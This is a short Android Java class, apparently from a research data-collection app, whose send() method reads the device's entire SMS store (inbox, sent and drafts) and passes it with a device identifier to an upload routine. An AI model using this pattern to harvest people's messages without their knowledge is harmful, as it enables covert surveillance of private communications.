package edu.real.async.android;

import android.content.Context;

public class SMSSenderThread extends SenderThread {

    public SMSSenderThread(Context _ctx, String device_id) {
        super(_ctx, device_id);
    }

    protected void send() {
        // Refs: https://stackoverflow.com/questions/848728/how-can-i-read-sms-messages-from-the-device-programmatically-in-android/32153303
        // public static final String INBOX = "content://sms/inbox";
        // public static final String SENT = "content://sms/sent";
        // public static final String DRAFT = "content://sms/draft";

        sendAllContent("content://sms", "S", "s", "SMS", "sms-send");
    }
}
